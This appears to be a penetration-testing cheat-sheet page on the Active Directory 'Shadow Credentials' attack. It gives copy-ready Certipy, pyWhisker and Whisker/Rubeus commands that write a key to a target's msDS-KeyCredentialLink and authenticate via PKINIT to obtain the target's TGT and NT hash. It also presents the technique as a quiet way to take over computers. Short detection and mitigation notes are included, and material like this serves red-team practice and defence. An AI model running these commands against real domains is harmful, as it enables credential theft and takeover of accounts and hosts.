---
title: Shadow Credentials
category: AD / ACL abuse
order: 50
tags: [shadow-credentials, keycredentiallink, pkinit, pywhisker, certipy, ngc]
summary: >
  Write a key to a target's msDS-KeyCredentialLink and you can authenticate as
  them via PKINIT — no password reset, fully reversible. The preferred abuse of
  GenericWrite / AddKeyCredentialLink on a user or computer.
prerequisites:
  - GenericAll / GenericWrite / AddKeyCredentialLink over the target
  - A KDC that supports PKINIT (a CA / DC certificate present — usually true with AD CS)
tools: [Certipy (shadow), pyWhisker, Whisker + Rubeus, bloodyAD]
detection:
  - 5136 writes to msDS-KeyCredentialLink; PKINIT auth (4768 with certificate) for the target
mitigation:
  - Restrict who can write the attribute; enforce PKINIT strong mapping; monitor KeyCredentialLink changes
refs:
  - { label: "SpecterOps — Shadow Credentials", url: "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" }
  - { label: "pyWhisker", url: "https://github.com/ShutdownRepo/pywhisker" }
---

`msDS-KeyCredentialLink` holds public keys for passwordless (NGC) logon. If you
can write it, add your own key, PKINIT as the target to get a TGT + NT hash, then
remove the key.

## One-shot (Certipy)

```sh
certipy shadow auto -u $user@$domain -p $password -account $target_user -dc-ip $dc_ip
# -> prints the target's NT hash and drops a TGT
```

## Manual (pyWhisker + PKINIT)

```sh
pywhisker.py -d $domain -u $user -p $password --target $target_user --action add
# then use the emitted cert/key: gettgtpkinit.py -> getnthash.py
```

## Windows (Whisker + Rubeus)

```powershell
Whisker.exe add /target:$target_user
Rubeus.exe asktgt /user:$target_user /certificate:<b64> /getcredentials /nowrap
```

> Works on **computers** too (GenericWrite on a machine object) — a quiet
> alternative to RBCD for taking over a host.
